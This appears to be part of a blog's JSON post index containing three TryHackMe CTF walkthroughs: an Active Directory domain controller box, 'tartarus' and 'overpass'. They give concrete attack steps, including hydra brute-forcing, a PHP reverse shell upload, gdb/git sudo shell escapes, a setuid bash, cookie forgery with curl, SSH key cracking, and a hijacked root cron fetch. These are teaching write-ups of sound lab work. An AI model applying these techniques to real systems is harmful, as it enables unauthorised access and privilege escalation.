    "content": "Most of the Corporate networks run off of AD. We are going to exploit a DOMAIN CONTROLLER. With the kerbrute and impacket tools to enumerate the box .  Let’s scan for the open ports with the nmap                               ImpacketInstalling Impacket:First, you need to clone the repo with: git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket This will clone Impacket to /opt/impacket/ once the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. Setup.py is commonly skipped during the installation. It’s key that you DO NOT miss it. So let’s install the requirements: pip3 install -r /opt/impacket/requirements.txtOnce all the python modules are installed, we can then run the python setup install script cd /opt/impacket/ &amp;&amp; python3 ./setup.py installAfter that, Impacket should be correctly installed and then download the kerbrute https://github.com/ropnop/kerbrutewe have got the users account and the svc-admin user names of the spookysec.local. Let’s run a tool from IMPACKET to collect the hash of a svc-admin accountwe got the hash save it to a file and crack the hash with the hashcat                               We have a valid user name and the password let’s check the shares with the SMBCLIENTAs the backup account password is stored in base64 format  let’s decrypt it by echo \" hash \" | base64 -dAs we have the backup account le’s try to dump the HASHES by dumping the NTFS.DIT by using the impacket toolWe got the Administrator hash. We are going to PASS THE HASH attack to authenticate with out the password as a AdministratorThat’s all for to day hope you like the box. HAVE A GOOD DAY"
  },
  
  {
    "title": "tartarus",
    "url": "/posts/tartarus/",
    "categories": "CTF, THM",
    "tags": "Rust scan",
    "date": "2021-06-25 00:00:00 +0530",
    





    
    "snippet": "We are going to solve an CTF challenge called the tartarus. This is a beginner box based on simple enumeration of services and basic privilege escalation techniques. We have 3 port open FTP , SSH &...",
    "content": "We are going to solve an CTF challenge called the tartarus. This is a beginner box based on simple enumeration of services and basic privilege escalation techniques. We have 3 port open FTP , SSH &amp; HTTP. We do brute force with hydra to login as www-data and upload a reverse shell to connect into the boxWe will start with rust scan to find the open ports                               As the port 80 is open let’s fire the nikto and save the output to a file nikto.lognikto had find the robots.txt lets open it and we have a secret admin directory. and we found users id and credentials let’s download it with wgetAs the FTP SERVER allows anonymous login let’s login as anonymouswe found the super secret directory. let’s run the gobuster to find more directorieswe found the login page at /super-secret and we have users id and credentials let’s run the HYDRA  to get the valid user and passwordhydra IP -L userid -P credentials.txt http-post-form \"/sUp3r-s3cr3t/authenticate.php/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Incorrect*\"                               we are having a upload page. Let’s upload a php-reverse-shell to get the shell. We found it in /super secret /images/uploadslet’s open the port and wait for the connection. Am using pwncat tool for listening you can find the pwncat in GitHubwe are into the box as the www-data user let’s check if we have the sudo permission to the user sudo -lour user may run the gdb as thirtytwo user with out the password.sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quitwe are the thirtytwo user now and let’s check what sudo permissions we have darckh user who may run the git with out root passwordsudo -u d4rckh /usr/bin/git help configA little bit of enumeration we had find that we can write the cleanup.py script we edit the script to give us the setuid binary to the darckh user so that we can have root permissionchmod +s /bin/bashThat’s all for to day hope you like the box see you i next tutorial until then good bye have  a great day"
  },
  
  {
    "title": "overpass",
    "url": "/posts/overpass/",
    "categories": "CTF, THM",
    "tags": "linpeas",
    "date": "2021-06-09 00:00:00 +0530",
    





    
    "snippet": "we are going to solve an online challenge called the overpass. As we find the two open ports one is being ssh on port 22 and the other HTTP on port 80. we find the private ssh key and we will crack...",
    "content": "we are going to solve an online challenge called the overpass. As we find the two open ports one is being ssh on port 22 and the other HTTP on port 80. we find the private ssh key and we will crack the password with john tool through which we will ssh into the box and we will do some basic enumeration in the box to get the root user with all being said lets get startedFirst we will start with the nmap to find the open portsnmap -sC -sV -oN nmap/initial_scan $IPLet’s take a look at the port 80. we have Overpass page saying that a secure password manager with support for windows, Linux, macos and moreLet’s fire up the gobuster to find the directories and the pages present in it and save the output yo gobuster.loggobuster dir -u http://10.10.44.66/ -w /usr/share/wordlist/dirbuster/directorylist-2.3-medium.txt -o gobuster.log Lets open the /admin page we find a simple login page nothing interesting there. let’s open the page source we will find the login.js java script there open the java script file as we send the request sessiontoken = something.  we will get to /adminLet send the request through the curl by adding the cookie sessiontoken=anythingcurl \"http://10.10.44.66/admin/\" --cookie \"SessionToken=anything\"Here we got an private ssh key. copy the private ssh key to a file and change the permission of the private key and lets try to ssh it with the keyAs the private key is asking for password lets try to crack it with the john too. For this john has a ssh2john,py script first we have to execute a script on private key and save it to a filessh2john.py id_rsa &gt; forjohn.txtNow run the john tool we will get the password as james13As we have the private ssh key and the password lets ssh into itwe are now in as a low level user let’s do some enumeration to get the high level user. Let’s start the HTTP server and upload the linpeas.sh and run itpython3 -m http.server &amp;&amp; chmod +x linpeas.sh &amp;&amp; ./linpeas.shA little bit of enumeration our user can run curl as root only on overpass.thm domainLet’s modify the domain address to our ip address so that we can get the root usermake the request is going through the downloads/src/buildscript.sh let’s make the directories for it and make the bildscript.sh to run in bash and start the http servermkdir -p downloads/src &amp;&amp; cd $_ &amp;&amp; vi buildscript.sh &amp;&amp;sudo python3 -m http.server                        These script will  gives us the accessible root privileges through bash binary setuidThat’s all for to day hope you like the box see you i next tutorial until then good bye have  a great day"
  }
  
]

